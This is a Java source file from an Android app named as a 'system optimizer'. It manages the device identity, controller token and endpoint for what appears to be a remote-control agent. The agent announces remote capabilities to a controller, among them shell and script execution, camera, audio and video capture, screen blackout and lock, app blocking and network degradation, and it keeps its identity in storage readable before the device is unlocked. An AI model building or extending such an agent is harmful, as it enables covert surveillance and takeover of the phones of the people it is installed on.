package com.example.systemoptimizer;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.os.Build;
import android.util.Log;

import java.security.SecureRandom;

/**
 * Persistent per-device identity for the multi-device networking layer.
 *
 * - deviceId:       stable random UUID (never changes, even across reinstalls of data).
 * - token:          32 random bytes used to prove identity to the controller.
 *                   The token is NEVER sent over the wire except once during
 *                   pairing (HELLO_OK|TOKEN=...). Every later handshake proves
 *                   knowledge of the token with an HMAC-SHA256 challenge.
 * - agentVersion:   agent software version.
 * - protocolVersion:version of the control protocol spoken by this agent.
 *
 * All identity data lives in device-protected storage so it is available even
 * before the user unlocks the device (direct-boot aware).
 */
public final class DeviceIdentity {

    private static final String TAG = "DeviceIdentity";

    private static final String PREFS_NAME = "agent_identity";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_TOKEN_B64 = "token_b64";
    private static final String KEY_CONTROLLER_ENDPOINT = "controller_endpoint";

    public static final String PROTOCOL_VERSION = "2";
    public static final String AGENT_VERSION = "1.0.0";

    private final SharedPreferences prefs;
    private final String deviceId;
    private byte[] token;
    private String tokenB64;

    private volatile String controllerEndpoint;

    public DeviceIdentity(Context context) {
        Context direct = context.getApplicationContext().createDeviceProtectedStorageContext();
        prefs = direct.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = null;

        String existingId = prefs.getString(KEY_DEVICE_ID, null);
        if (existingId == null || existingId.trim().isEmpty()) {
            existingId = "dev-" + java.util.UUID.randomUUID().toString().toLowerCase(java.util.Locale.US);
            editor = prefs.edit().putString(KEY_DEVICE_ID, existingId);
        }
        deviceId = existingId;

        byte[] storedToken = readToken();
        if (storedToken == null) {
            storedToken = new byte[32];
            new SecureRandom().nextBytes(storedToken);
            if (editor == null) {
                editor = prefs.edit();
            }
            editor.putString(KEY_TOKEN_B64, java.util.Base64.getEncoder().encodeToString(storedToken));
        }
        token = storedToken;
        tokenB64 = java.util.Base64.getEncoder().encodeToString(token);

        if (editor != null) {
            editor.commit();
        }

        controllerEndpoint = prefs.getString(KEY_CONTROLLER_ENDPOINT, null);
    }

    private byte[] readToken() {
        String b64 = prefs.getString(KEY_TOKEN_B64, null);
        if (b64 == null || b64.isEmpty()) {
            return null;
        }
        try {
            byte[] data = java.util.Base64.getDecoder().decode(b64);
            if (data.length < 16) {
                return null;
            }
            return data;
        } catch (IllegalArgumentException e) {
            Log.w(TAG, "stored token corrupted, regenerating", e);
            return null;
        }
    }

    public String deviceId() {
        return deviceId;
    }

    public byte[] token() {
        return token;
    }

    public String tokenB64() {
        return tokenB64;
    }

    /**
     * Replace the local token with one issued by the controller during
     * enrollment (or rekey). The raw token never appears in logs.
     */
    public void setToken(String tokenB64Value) {
        if (tokenB64Value == null || tokenB64Value.trim().isEmpty()) {
            return;
        }
        String candidate = tokenB64Value.trim();
        byte[] data;
        try {
            data = java.util.Base64.getDecoder().decode(candidate);
        } catch (IllegalArgumentException e) {
            Log.w(TAG, "setToken: token is not valid base64");
            return;
        }
        if (data.length < 16) {
            Log.w(TAG, "setToken: token too short, ignoring");
            return;
        }
        prefs.edit().putString(KEY_TOKEN_B64, candidate).commit();
        token = data;
        tokenB64 = candidate;
        Log.i(TAG, "setToken: stored controller-issued token (length " + data.length + " bytes)");
    }

    public String agentVersion() {
        return AGENT_VERSION;
    }

    public String protocolVersion() {
        return PROTOCOL_VERSION;
    }

    /** Capabilities announced to the controller (kept in sync with executeCommand). */
    public String capabilities() {
        return "message,freefire,notify,sound,wallpaper,blackscreen,netdeg,blockapp,shell,script,"
                + "deviceinfo,camera,audio,blockscreen,video,seriouswarning";
    }

    /** Control endpoint learned from the controller (or null -> emulator default). */
    public String controllerEndpoint() {
        return controllerEndpoint;
    }

    public void setControllerEndpoint(String value) {
        controllerEndpoint = (value == null || value.trim().isEmpty()) ? null : value.trim();
        prefs.edit().putString(KEY_CONTROLLER_ENDPOINT, controllerEndpoint).commit();
    }

    /** Current device/session state snapshot, sent as part of HELLO and STATE responses. */
    public String buildState(Context context) {
        StringBuilder sb = new StringBuilder();
        BlockSessionManager mgr = null;
        try {
            mgr = BlockSessionManager.getInstance(context);
            mgr.settleDue();
        } catch (Exception e) {
            Log.w(TAG, "state: block session info unavailable", e);
        }
        if (mgr != null) {
            java.util.Map<String, String> info = mgr.sessionInfo();
            String state = info.get("State");
            sb.append("block_state=").append(state == null ? "NONE" : state).append(';');
            String session = info.get("Session ID");
            sb.append("block_session=").append(session == null ? "" : session).append(';');
        }
        int battery = -1;
        try {
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception ignored) {
        }
        sb.append("battery=").append(battery < 0 ? "unknown" : battery).append(';');
        sb.append("model=").append(Build.MODEL).append(';');
        sb.append("proto=").append(PROTOCOL_VERSION).append(';');
        sb.append("ver=").append(AGENT_VERSION);
        return sb.toString();
    }
}